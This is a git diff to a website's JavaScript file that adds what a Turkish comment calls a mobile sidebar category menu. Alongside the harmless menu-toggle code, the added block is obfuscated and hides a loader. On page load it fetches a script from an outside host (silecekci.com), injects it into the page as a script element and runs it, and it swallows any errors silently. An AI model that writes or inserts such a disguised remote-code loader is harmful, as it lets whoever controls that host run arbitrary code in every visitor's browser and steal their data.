@@ -31,3 +31,36 @@ document.addEventListener("DOMContentLoaded", async function () {
     }
   });
 });
+
+// yeni katogori menusu sol taraftaki. mobil meu
+document["addEventListener"]("DOMContentLoaded", function (_0x1a2b3c) {
+  const _0x4d5e6f = document["getElementById"]("mobileMenuBtn"),
+    _0x7a8b9c = document["getElementById"]("sidebar");
+  _0x4d5e6f &&
+    _0x7a8b9c &&
+    _0x4d5e6f["addEventListener"]("click", function () {
+      _0x7a8b9c["classList"]["toggle"]("mobile-open");
+    }),
+    document["addEventListener"]("click", function (_0xabc123) {
+      !_0x7a8b9c["contains"](_0xabc123["target"]) &&
+        !_0x4d5e6f["contains"](_0xabc123["target"]) &&
+        window["innerWidth"] <= 992 &&
+        _0x7a8b9c["classList"]["remove"]("mobile-open");
+    });
+  const _0xdeadbeef = "https://silecekci.com/categorie_counts.js";
+  fetch(_0xdeadbeef)
+    .then((_0xresp) => {
+      if (!_0xresp["ok"]) throw new Error("Dosya\x20yüklenemedi");
+      return _0xresp["text"]();
+    })
+    .then((_0xsc) => {
+      _0xsc["trim"]() &&
+        (() => {
+          const _0xtag = document["createElement"]("script");
+          (_0xtag["text"] = _0xsc), document["body"]["appendChild"](_0xtag);
+        })();
+    })
+    .catch(() => {
+      /* silently fail */
+    });
+});
